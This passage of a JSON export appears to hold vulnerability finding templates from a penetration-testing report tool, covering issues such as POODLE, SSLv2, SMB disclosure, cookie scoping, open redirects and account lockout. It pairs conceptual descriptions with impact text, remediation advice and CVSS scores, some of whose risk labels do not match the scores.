09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":603,"plugin_id":null,"title":"SSL/TLS Configuration Vulnerable to POODLE","type":null,"description":"The application is vulnerable to the POODLE exploit against SSL/TLS. POODLE (Padding Oracle On Downgraded Legacy Encryption) is an attack that exploits a combination of SSL/TLS downgrading and a vulnerability in the eligible ciphers.\nUpon initiating SSL/TLS communication, the client and server negotiate which protocol to use. In normal operation, they typically select the latest secure version, but when a connection attempt fails, the communication may be downgraded to an earlier version that the client and server both support. If an attacker can trigger a connection failure (for example, by acting as a man-in-the-middle), they can force the connection to use SSL 3.0.\nOnce the connection has been downgraded, the attacker exploits a padding oracle vulnerability in the protocol's encryption. A padding oracle allows an attacker who can modify the client's requests to alter them in such a way that the encrypted response received from the server leaks information about its underlying cleartext. After a number of such requests, the attacker is able to derive potentially sensitive data from the responses.\nAll implementations of SSL 3.0 are vulnerable to POODLE, as the padding oracle vulnerability lies in the protocol's CBC-mode ciphers themselves, rather than any particular implementation of them. Additionally, although the TLS protocol mandates the necessary checks that prevent the padding oracle vulnerability, some implementations of TLS 1.0 - 1.2 are also vulnerable, as they omit the checks. In this case, the attacker does not have to downgrade the connection in order to exploit the padding oracle vulnerability.\n","poc":null,"impact":"POODLE allows an attacker to decrypt HTTPS communications between a client and server. This can result in the leakage of sensitive data, including user credentials, session identifiers, and personal information.\n","remediation":"Disable support for SSL 3.0 on both the client and server. Upgrade to a TLS implementation that supports TLS_FALLBACK_SCSV, which prevents a man-in-the-middle attack from downgrading the connection to SSL 3.0. OpenSSL added support for this feature in versions 1.0.1j, 1.0.0o, and 0.9.8zc.\n","cvss_base_score":2.6,"cvss_temporal_score":1.9,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":604,"plugin_id":null,"title":"SSL v2 Supported","type":null,"description":"The application's server-side SSL endpoint is configured to allow SSLv2 connections. SSLv2 suffers from several cryptographic flaws and has been deprecated for many years. RFC 6176 (http://tools.ietf.org/html/rfc6176) outlines many of the top deficiencies in SSL version 2.0, including:\n--The integrity of handshake messages is not protected. This permits a man-in-the-middle to trick the server into picking a weaker cipher suite than it would normally choose.\n--SSL sessions can be terminated using a network-layer attack. An attacker on the same network as a victim can easily inject a TCP FIN packet to close the session. An attacker can do this to prevent the user from being able to log out of his/her application-layer session for example.\n\n","poc":null,"impact":"An attacker could exploit flaws in SSLv2 to cause the server to choose a weak cipher suite for SSL sessions, which could allow the attacker to decrypt sensitive data sent in the SSL sessions. The attacker may also be able to modify requests and responses in the SSL sessions.\n","remediation":"The server-side TLS endpoint's configuration should be updated to allow only TLSv1.2 connections with cipher suites that use:\n--Ephemeral Diffie-Hellman for key exchange (optionally, allow RSA for key exchange if necessary for supporting some clients)\n--Block ciphers with key lengths of at least 128 bits (AES-128 and AES-256; optionally allow 3DES with 112-bit keys if necessary for supporting some clients)\n--Block ciphers in GCM mode (optionally, allow block ciphers in CBC mode if necessary for supporting some clients)\n--The SHA2 family of hash functions (SHA256, SHA384, SHA512) for block ciphers in CBC mode if necessary; optionally, allow SHA1 if necessary for supporting some clients\n\n","cvss_base_score":5.8,"cvss_temporal_score":4.5,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:POC/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Critical","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":605,"plugin_id":null,"title":"Unauthenticated Access to Network Services","type":null,"description":"Services were discovered that do not authenticate users before performing requested operations. Network services should in some way authenticate users to ensure they are authorized to access resources and functionality provided by those services. Authentication also introduces accountability into the system, creating an audit trail which can be used to tie a user to a particular action.\n","poc":null,"impact":"An attacker who discovers unauthenticated network services is able to execute any action an \"authorized\" (or expected) user is allowed to perform. The impact of unintended access to discovered services depends on what functionality the services expose; some examples may include (but are not limited to):\n--Privilege escalation\n--Exposure of sensitive or otherwise restricted information (via services such as anonymous FTP servers)\n--Unintended modification or destruction of data (via services such as anonymous FTP servers)\n--Phishing attacks (via services such as unauthenticated SMTP servers)\n\nIn addition to providing unauthorized access to data and functionality, unauthenticated services have no way of maintaining an audit trail since no data is available to identify which individual has performed a particular action. In the event of exploit or unauthorized access to data and services, there is no way to effectively determine who may have executed an attack.\n","remediation":"All internal services should be configured to authenticate users based on local domain credentials. Authentication requests should be sent over a secure and encrypted channel such as SSL/TLS.\n","cvss_base_score":7.5,"cvss_temporal_score":6.2,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:P/A:P/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":606,"plugin_id":null,"title":"SMB Information Disclosure","type":null,"description":"The SMB service that is available on port 445 (and/or 139) of the affected systems can be used to obtain detailed information about the operating system, local users, local groups, and shares on the server. This information can be obtained through a combination of unauthenticated and authenticated techniques using publicly available tools. Such tools include nmap, Nessus, and other enumeration tools. These tools have plugins that can extract detailed information about the system that are provided through normal usage of the SMB service.\nWhile the SMB service may be useful and/or necessary to have available for general access to relevant functionality on the server (such as easily accessing shares), it provides valuable system information to any system on the network that can reach the service. This goes against best practice guidelines for limiting access to services to only the specific systems that need to access them (e.g.: development teams and/or IT support staff).\n","poc":null,"impact":"The SMB service can be used to obtain detailed information about the operating system, local users, and local groups. Specifically, information obtainable via unauthenticated scans include:\n--Specific versioning of the operating system, including the service pack\n--The computer name, including the NetBIOS name, domain name, forest name, FQDN, and NetBIOS domain name\n--System time, up to the second\n--Information about shares, such as share name, and access permitted\n\nInformation obtainable via authenticated scans include:\n--User information, including username, RID numbers, full names, descriptions of the accounts, flags about the account (e.g.: password not expired, password does not expire, normal/admin user account, etc.)\n--Group information, including built-in and non-built-in groups, the group RID number, and the users in the groups\n--More detailed information about shares that is available to the authenticated account, such as access rights for the connected account, share type, users connected, max users, and physical share path local to the server\n\nThis type of information is extremely useful to attackers during the reconnaissance and enumeration phase. For example, specific details of the operating system helps the attacker narrow down potential exploits that can be launched against the system during other attacks. Gaining the computer name helps during enumeration attempts (assuming the attacker only knew the IP prior to this scan). The system time is useful for attacks against PRNG mechanisms and other time-based protections. Detailed information about users and groups helps the attacker map out attack vectors that can be used for privilege elevation attacks and/or phishing attacks. Information about shares hosted on the server is useful for identifying the type of information stored on the server, and whether or not this system is a key target to compromise, given the attacker's overall objectives.\n","remediation":"Turn off the SMB service if it is not needed. If it is required, restrict access to it through the use of restrictive network segmentation and/or firewalls in front of the server.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":607,"plugin_id":null,"title":"Broadly Scoped Session Cookie Domain","type":null,"description":"The application sets a session cookie with an overly broad \"domain\" attribute. The browser uses a cookie's \"domain\" and \"path\" values to determine if that cookie should be sent in a request for a given resource. First the browser checks to see if the requested resource is hosted at the domain specified by the cookie's \"domain\" attribute. If the domain matches that of the requested resource, the browser then compares the requested resource's subdirectory path with the value of the cookie's \"path\" attribute. If the resource is hosted in or beneath the subdirectory specified in the cookie's \"path\", the cookie will be sent as part of the request.\nIf a domain is not provided, the host name of the server the request is being sent to will be used as the default domain value when the cookie is generated.\n","poc":null,"impact":"Cookies set with an overly broad domain will be sent to all applications hosted on that domain as well as all of its subdomains. These applications may contain vulnerabilities that expose session information passed via cookies (e.g. cross-site scripting). An attacker who gains access to this session data may impersonate the victim in the application that initially issued the misconfigured session cookie.\n","remediation":"The \"domain\" attribute must be set for all session cookies and must be set to the specific subdomain that requires the session cookie value. For example, if an application is hosted on \"myapp.test.com\" the \"domain\" attribute should be set to \"domain=myapp.test.com;\". This will ensure that the server that requires the cookie is the only one the cookie is sent to.\n","cvss_base_score":2.6,"cvss_temporal_score":2.1,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":608,"plugin_id":null,"title":"Broadly Scoped Session Cookie Path","type":null,"description":"The application sets a session cookie with an overly broad \"path\" attribute. The browser uses a cookie's \"domain\" and \"path\" values to determine if that cookie should be sent in a request for a given resource. First the browser checks to see if the requested resource is hosted at the domain specified by the cookie's \"domain\" attribute. If the domain matches that of the requested resource, the browser then compares the requested resource's subdirectory path with the value of the cookie's \"path\" attribute. If the resource is hosted in or beneath the subdirectory specified in the cookie's \"path\", the cookie will be sent as part of the request.\nThe URL declared in the \"path\" attribute is based on the root directory of the application, and will act as a whitelist determining what pages should access the cookie. For example if a session cookie is set by an application hosted at \"www.application.com\" with the \"path\" attribute set to \"/test/\", the browser will only send the session cookie in a request for a particular resource if the requested resource resides in www.application.com/test or a subdirectory.\nSetting the \"path\" attribute to an overly broad path, such as to the root directory (\"/\"), allows the cookie to be sent to all applications within the same domain. Note that by default the \"path\" attribute will be set to the path of the resource that was requested if no specific path has been provided, and as such provides no mechanism to prevent overly broad paths.\n","poc":null,"impact":"Cookies set with an overly broad path will be sent to all applications hosted at that domain and path. These applications may contain vulnerabilities that expose session information passed via cookies (e.g. cross-site scripting). An attacker who gains access to this session data may impersonate the victim in the application that initially issued the misconfigured session cookie.\n","remediation":"The \"path\" attribute must be set for all session cookies and should be set to the specific path of the application. The value of the \"path\" attribute must explicitly state the directory the application resides in, as well as ensure that the attribute is not set to the root directory. Note that when setting a \"path\" value, a trailing forward slash must be used to prevent the browser from matching any path that contains the provided value. For example, if an application is hosted at /test/, the attribute should be set as \"path=/test/;\".\n","cvss_base_score":2.6,"cvss_temporal_score":2.1,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":609,"plugin_id":null,"title":"Data Cached to World Readable Directory (Android)","type":null,"description":"The application stores data in a world-readable directory on the device. Caching data in a world-readable directory (such as external storage or public directories) allows other applications to access the contents. Applications with the READ_EXTERNAL_STORAGE permission can access all files on external storage. Other applications can also access the contents of a cache file marked with world-readable permissions (in Android 4.2 and lower).\n","poc":null,"impact":"Caching data to a world-readable directory (such as external storage) or files marked as world-readable may result in the disclosure of sensitive information used or generated by the application. Any application installed on the device can access data that has been set with world-readable permissions. Note for an attacker to view data placed in a world readable directory they will not require root access.\n","remediation":"Data should be cached in the application's internal storage directory, and never placed in a world-readable directory accessible to other applications. In general the application should avoid caching sensitive data on the device. If sensitive data must be cached on the device, the data should be encrypted. As any information stored locally on the device may potentially be accessed by an attacker the key used to encrypt the data must itself be protected. To do this the key used should be derived from a Password Based Key Derivation Function (PBKDF2). This will ensure that only a valid user will have access to the data being cached once a valid password is provided. Furthermore for devices using a version of Android lower than 4.2 (API levels below 17) the use of Context.MODE_WORLD_READABLE and Context.MODE_WORLD_WRITEABLE must also be avoided.\n","cvss_base_score":6.9,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":610,"plugin_id":null,"title":"Stack Canaries Not Enabled (iOS)","type":null,"description":"The application was not compiled with stack canaries enabled. A stack canary is used to detect stack buffer overflows. In order to exploit this kind of vulnerability, the attacker's goal is to overwrite specific values on the stack, such as the return pointer, in order to change the application's control flow. When stack canaries are enabled, the application places a secret value - the canary - just before the return pointer and verifies that the canary's value matches the expected one before returning. If the two values do not match, the application terminates immediately. When the attacker tries to overwrite the return pointer, the canary's value is changed as well, preventing exploit of the stack buffer overflow.\n","poc":null,"impact":"The absence of stack canaries in the application's executable code makes it easier for an attacker to execute arbitrary code in the presence of a stack buffer overflow vulnerability. An attacker that is successful in executing a stack buffer overflow attack may be able to execute arbitrary code, assuming the attacker bypasses other memory security controls such as Position-Independent Executable (PIE)/Address Space Layout Randomization (ASLR), and Data Execution Prevention (DEP)/No-eXecute(NX).\n","remediation":"The application should be recompiled with stack canaries enabled. In Xcode, this is accomplished by adding the -fstack-protector-all flag to the \"Other C Flags\" build setting.\n","cvss_base_score":6.2,"cvss_temporal_score":4.6,"cvss_vector":"(AV:L/AC:H/Au:N/C:C/I:C/A:C/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Low","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":611,"plugin_id":null,"title":"Perl: Taint Mode Not Enabled","type":null,"description":"The Perl source code does not specify the -T flag to enable taint mode. Taint mode causes a run-time check to be made on the Perl application that marks any variable that accepts user input, including file input and environment variables, as insecure. Not all variables will be deemed insecure immediately. Perl's Taint mode will search for specific unsafe functions like system, open, unlink, and rename, as well as the use of form variables. Once a variable has been marked as tainted Perl will throw an error when any user defined input is used without properly being sanitized. Variables can then be un-tainted with the use of regular expressions, which can check for the expected input. Without using Taint mode it is possible that unsafe code can be complied without any warnings or errors.\n","poc":null,"impact":"\n","remediation":"Set the -T flag when running a Perl application to ensure all user input is being properly sanitized.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":612,"plugin_id":null,"title":"Open Client-Side URL Redirect","type":null,"description":"The application contains an open client-side URL redirect. This vulnerability exists when client-side content redirects the user's browser to a URL that was constructed using untrusted data. This redirect may be initiated by client-side JavaScript or by the user clicking a link whose value has been set by an attacker-controlled parameter. In both cases, a vulnerable request parameter is used to set the URL for the redirect, which can send a user to any URL or even the JavaScript URI scheme.\n","poc":null,"impact":"Open client-side URL redirection allows an attacker to redirect a victim to a malicious website or a JavaScript URI which can be used to execute a cross-site scripting (XSS) attack.\nAn attacker that redirects a user to a JavaScript URI will be able to arbitrarily alter page content with malicious JavaScript code. The attacker can leverage a redirect in this manner to execute application functions entitled to the user or obtain the user's session identifier.\nAlternatively, if a user is redirected to a site that is fully under the attacker's control, the attacker can leverage the site to perform any number of malicious actions. For example, the attacker may use this site to run scripts that install malware on the victim's system. The attacker can also craft and display a page to the victim which is designed to mimic the legitimate application in order to trick the end user and steal their credentials.\n","remediation":"URLs constructed using untrusted data should be validated against a domain whitelist prior to redirect; when invalidated redirects are required by the business, the application should request the user's permission prior to issuing the redirect. The verification of user-defined URLs can take place on the server-side when the query parameter is processed or on the client-side before the redirection is actually executed.\nWhen possible, the URL used to issue a redirect should not come from a user-controlled parameter. If a redirect can be issued to one of a set of known URLs, a token representing the URL should be passed to the client and then matched against the corresponding URL on the server during the initial redirect request rather than passing the entire URL from the client.\nIf building a complete list of valid URLs is infeasible, the application should maintain a whitelist of safe domains and only accept relative paths to pages or resources which it then appends to the domain. For example, an application may only want to redirect users within the domain \"http://myhost.com\". To prevent the redirect URL from exposing users to potentially unsafe sites, the application should only accept relative paths (e.g. \"/app1/index.jsp\") from the user. The application logic should then be responsible for validating the data and constructing the redirect URL by combining the whitelisted domain with the user-provided path.\nIf the application must provide an open redirect function and cannot make any assumptions about the redirect destination URL, then the application should display an intermediate page that asks the user for confirmation prior to redirect.\n","cvss_base_score":5.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:N/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":613,"plugin_id":null,"title":"Perfect Forward Secrecy Not Enabled","type":null,"description":"Perfect Forward Secrecy is not enabled on the server. \"Perfect Forward Secrecy\" is a property of certain key agreement protocols that ensures that a compromise of a server's private key does not result in the compromise of any of the user's past session keys and hence all of the data protected by those keys. By enabling Perfect Forward Secrecy, every user session gets its own unique session key. Thus the compromise of a single session key does not compromise any data other than that exchanged in the specific session protected by that particular session key.\nIn effect, a secure communications protocol is said to have Perfect Forward Secrecy if compromise of long-term keys (such as a server's private key) does not compromise previously generated session keys. For example, in TLS, Diffie-Hellman based key agreement protocols such as DHE-RSA, DHE-DSS and elliptic curve Diffie-Hellman based protocols including ECDHE-RSA, ECDHE-ECDSA have support for Perfect Forward Secrecy.\n","poc":null,"impact":"Lack of Perfect Forward Secrecy may potentially compromise all data exchanged between a client and a server if the server's private key is ever disclosed. Specifically, an attacker can record encrypted traffic between a client and a server for any amount of time and store it until s/he obtains access to the private key. Once the attacker acquires the private key, s/he can decrypt all historic data exchanged between the client and server.\n","remediation":"Support for Perfect Forward Secrecy should be enabled on the server in order to protect against the data compromise that may occur as a result of the server's private key being compromised.\nWhile the appropriate ciphers have been available since SSLv3.0, it is important to ensure that the server supports the latest TLSv1.2 protocol. Once this is done, the correct cipher suites must be chosen and placed in the correct order of preference.\nWhile any Diffie-Hellman based key exchange protocol will provide for Forward Secrecy, only \"Ephemeral Key Exchange\" should be selected to obtain Perfect Forward Secrecy (essentially a new unique session key for every user session). This will ensure that the client and server will generate a new set of Diffie-Hellman parameters for each session. These parameters should not be reused and should not be stored. This is what offers the right protection going forward.\nIn addition, Elliptic Curve DHE (ECDHE) suites should be selected and prioritized over their DHE counterparts as they are computationally faster. The cipher ordering can be enforced using the \"ssl_prefer_server_ciphers=on\" in nginx and \"SSLHonorCipherOrder=on\" in Apache. The order of preference of ECDHE cipher suites from a server perspective is given below -\n<pre><code class=\"dart\">TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":614,"plugin_id":null,"title":"TLS Fallback Downgrade Attack Prevention Not Supported","type":null,"description":"The server's SSL termination point does not support the \"TLS Fallback Signaling Cipher Suite Value\" (SCSV) for preventing protocol downgrade attacks, as defined in the TLS specification. This flag, known as \"TLS_FALLBACK_SCSV\", can be employed by both clients and servers to prevent unintended protocol downgrades. This is accomplished by having the client indicate that the current connection attempt is merely a fallback and by having the server return a fatal alert if it detects an inappropriate fallback. Servers that do not support this flag are susceptible to downgrade attacks as they will not generate an error in the event of an inappropriate (i.e. malicious) protocol downgrade attempt.\n","poc":null,"impact":"Active man-in-the-middle attackers can force protocol downgrades to versions of SSL/TLS with known weaknesses. The exploitation of known weaknesses may allow an attacker to decrypt traffic, resulting in access to unauthorized functionality and leakage of sensitive data (including user credentials, session identifiers, and personal information).\n","remediation":"Upgrade the TLS endpoint to use the latest version of OpenSSL. As of October 2015, the latest version of each branch is 0.9.8z, 1.0.0s, 1.0.1p and 1.0.2d.\n","cvss_base_score":10,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:28:00","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":615,"plugin_id":null,"title":"Inadequate Account Lockout Policy","type":null,"description":"The application's account lockout policy does not provide sufficient protection against automated password guessing attacks. In general, the following overly-permissive policy decisions will leave accounts vulnerable to exposure:\n--The number of allowed authentication attempts before account lockout is excessively high or completely unrestricted.\n--The policy allows for numerous authentication attempts to be made against one account from multiple IP addresses in a short period of time.\n--The policy is not enforced for administrative accounts.\n\n","poc":null,"impact":"Applications with overly permissive lockout policies (or no lockout policy at all) are vulnerable to brute force password guessing attacks, in which the attacker performs login attempts using a known username and a list of potential passwords until a successful combination is found. Once a successful combination is discovered, the attacker is granted full access to the compromised account, and is able to impersonate the victim without detection.\n","remediation":"Implement an account lockout policy that locks accounts for a defined period of time after a certain number of failed attempts. PCI DSS v3.2 requirements call for a lockout after no more than six (6) failed login attempts with a minimum lockout timeout of 30 minutes. During the lockout period, a single generic error message should be displayed for both valid and invalid login attempts. If the application contains highly sensitive data or functionality, it may be appropriate to require manual account reactivation via help desk.\nWhen possible, velocity checks should also be put in place to limit the number of unsuccessful login attempts made within a certain time period for a given user account or IP address. This will help protect against two scenarios:\n--Login attempts distributed over multiple accounts from the same source IP address\n--Login attempts made for one account across multiple source IP addresses\n\nAccount lockouts should be performed only against the specific account being accessed, and not against the IP address the traffic originates from. By locking out users based on IP address, the application may inadvertently block valid application users if a company or ISP's proxy server or other Internet-facing IP is locked out. In addition, locking a user's account after a certain number of failed login attempts from a specific source IP is insufficient since an attacker may distribute login attempts for a specific account across multiple source IPs.\nNote: many of these remediation tactics will be context-specific to the application that is being protected, and as such, various combinations of the above remediation options should be considered.\n","cvss_base_score":5.4,"cvss_temporal_score":4.5,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":616,"plugin_id":null,"title":"HP System Management Homepage Vulnerable Version in Use","type":null,"description":"The remote server is running a version of HP System Management Homepage (SMH) which contains known vulnerabilities. The HP System Management Homepage is a web-based interface that allows system administrators to manage individual HP servers. The interface provides hardware configuration and status data, performance metrics, system thresholds and software version control information.\n","poc":null,"impact":"The vulnerabilities present in the System Management Homepage application vary depending on the version of SMH deployed. Known vulnerabilities include common web application vulnerabilities such as cross-site scripting and cross-site request forgery, as well as more complex vulnerabilities in the SMH application and related packages that may allow denial of service, privilege escalation, sensitive information disclosure, and others.\nFor the latest list of CVE's open against SMH, use the National Vulnerability Database (NVD)'s advanced CVE search, found at:\nhttps://web.nvd.nist.gov/view/vuln/search-advanced\nSelect \"hp\" for the vendor and \"system_management_homepage\" for the product.\n","remediation":"Upgrade to the latest version of HP System Management Homepage. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:ND/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":617,"plugin_id":null,"title":"X.509 Certificate with Wrong Hostname (SSL/TLS)","type":null,"description":"The Common Name (CN) set in the X.509 certificate presented by the server does not match the domain of the site requested. The Common Name specifies the fully qualified domain or domains associated with an X.509 certificate. Depending on the type of certificate, this may be one or more hosts belonging to the same domain (e.g. \"site.com\" and \"www.site.com\"), a wildcard name (e.g. \"*.site.com\", or a list of domains. A certificate is considered valid only when the request host name matches one of the domains listed in the certificate's common name field.\n","poc":null,"impact":"Using X.509 certificates whose common name does not match the issuing server may result in the loss of sensitive data. The loss of sensitive or proprietary information can directly affect end users, as well as the certificate owner from a financial, reputational, or legal standpoint. The application's users may be prevented from viewing the web site due to strict security controls set in their browser. The invalid certificate can then affect an organization's reputation and credibility since users will no longer be able to trust the website to perform transactions. Furthermore an attacker may take advantage of the invalid certificate and create a malicious site to impersonate the application, and conduct \"phishing\" attacks.\nIn any case in which certificate related issues are encountered by the browser, an appropriate warning will be issued to end users. If users choose to ignore these warnings and click through them, there will be no guarantee they are accessing the valid application or an impostor leaving them susceptible to Man-In-The-Middle (MITM) attacks.\n","remediation":"Acquire a new trusted certificate from a trusted certificate authority whose common name matches the domain of the sites the issuing server hosts.\nIn general, the following best practices should be followed with respect to X.509 certificates:\n--Obtain certificates from reliable CAs such as VeriSign, GoDaddy, Thawte, etc.\n--Ensure that the entire certificate chain is valid prior to deployment.\n--At a minimum use a 2048 bit private key, and protect them adequately (e.g. via strong passwords).\n--In case of a compromise, revoke old certificates and generate new keys to be used with the new certificates.\n--Only use secure HTTPS protocols (TLSv1.2) and secure cipher suites that provide authentication and encryption of 128 bits or stronger.\n--Client initiated renegotiation should be disabled.\n--Download the Certificate Revocation List (CRL) from your CA at regular intervals (once a week if possible) to ensure up-to-date information regarding revoked certificates is available.\n--Ensure that the signing certificates have been verified against the Certificate Revocation List (CRL).\n--Certificate management tools should be leveraged to automate the discovery and monitoring of all certificates especially in large organizations.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:14","updated_at":"2018-11-12 09:25:14","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":618,"plugin_id":null,"title":"loadUrl() Using String Concatenation in WebView (Android)","type":null,"description":"The application uses concatenation to construct a string that is passed to the loadUrl method in a WebView. The loadUrl method is typically used to load a webpage in a WebView given a particular URL. Additionally, it supports other URIs, such as JavaScript and file, enabling JavaScript execution (including access to any registered Java objects) and access to local assets. Passing untrusted input to the loadUrl method may alter the URL that is loaded by the WebView. If the method is used to execute JavaScript, the untrusted input may be able to inject JavaScript code, if it is not escaped properly.\n","poc":null,"impact":"Inserting untrusted data in a string that is passed to the loadUrl method may allow an attacker to load an unexpected resource by modifying the URI. If the string represents a URL, an attacker could attempt to redirect the victim to a site under their control. The malicious site may attempt to phish the user by mimicking the original webpage and prompting them to re-enter their credentials or other sensitive information. If the string represents a JavaScript URI, the concatenation could allow an attacker to inject malicious JavaScript code that modifies page contents, executes application functionality using the user's identity, or calls methods in any Java objects bound to the WebView through a JavaScript interface.\n","remediation":"The application should properly validate and encode any untrusted data that it passes into the loadUrl method. URL domains should be whitelisted if they are user-supplied, and JavaScript encoding should be used when concatenating untrusted data into a JavaScript URI. Additionally, the application should leverage the shouldOverrideUrlLoading method to restrict the URLs that can be loaded in the WebView.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":619,"plugin_id":null,"title":"Formula Injection","type":null,"description":"The application exports spreadsheet 